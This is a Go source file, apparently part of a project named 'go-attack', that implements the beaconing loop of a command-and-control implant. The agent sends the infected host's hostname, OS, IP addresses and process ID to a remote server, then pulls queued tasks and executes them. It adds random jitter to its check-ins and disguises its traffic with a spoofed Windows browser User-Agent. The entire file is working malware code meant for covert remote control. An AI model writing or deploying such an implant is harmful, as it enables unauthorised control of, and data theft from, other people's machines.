package internal

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"log"
	"math/big"
	"net/http"
	"time"

	"github.com/ianwong123/go-attack/c2/protocol"
)

type Beaconer struct {
	agentID    string
	serverAddr string
	interval   time.Duration
	jitterMax  time.Duration
	client     *http.Client
	lastResult *protocol.Result
}

func New(agentID, serverAddr string, interval, jitterMax time.Duration) *Beaconer {
	return &Beaconer{
		agentID:    agentID,
		serverAddr: serverAddr,
		interval:   interval,
		jitterMax:  jitterMax,
		client:     &http.Client{Timeout: 10 * time.Second},
	}
}

func (b *Beaconer) Run(ctx context.Context) {
	log.Printf("agent started, id=%s", b.agentID)
	for {
		task, err := b.checkIn(ctx)
		if err != nil {
			log.Printf("agent checkin failed: %v", err)
		} else if task != nil {
			result := Run(task)
			b.lastResult = result
		}
		select {
		case <-ctx.Done():
			log.Printf("agent shutting down")
			return
		case <-time.After(b.nextInterval()):
		}
	}
}

// sends a beacon and returns a task if server has one queued
func (b *Beaconer) checkIn(ctx context.Context) (*protocol.Task, error) {
	info := Collect()
	beacon := protocol.Beacon{
		AgentID:  b.agentID,
		Hostname: info.Hostname,
		OS:       info.OS,
		Arch:     info.Arch,
		IPs:      info.IPs,
		PID:      info.PID,
		CheckIn:  time.Now().UTC(),
		Result:   b.lastResult,
	}
	b.lastResult = nil

	body, err := json.Marshal(beacon)
	if err != nil {
		return nil, fmt.Errorf("marshal beacon: %w", err)
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, b.serverAddr+"/beacon", bytes.NewReader(body))
	if err != nil {
		return nil, fmt.Errorf("build request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
	resp, err := b.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("http post: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNoContent {
		return nil, nil
	}

	var task protocol.Task
	if err := json.NewDecoder(resp.Body).Decode(&task); err != nil {
		return nil, fmt.Errorf("decode task: %w", err)
	}

	return &task, nil
}

// return beacon interval + crytographic random jitter
func (b *Beaconer) nextInterval() time.Duration {
	maxJitter := big.NewInt(int64(b.jitterMax))
	jitter, err := rand.Int(rand.Reader, maxJitter)
	if err != nil {
		return b.interval
	}
	return b.interval + time.Duration(jitter.Int64())
}
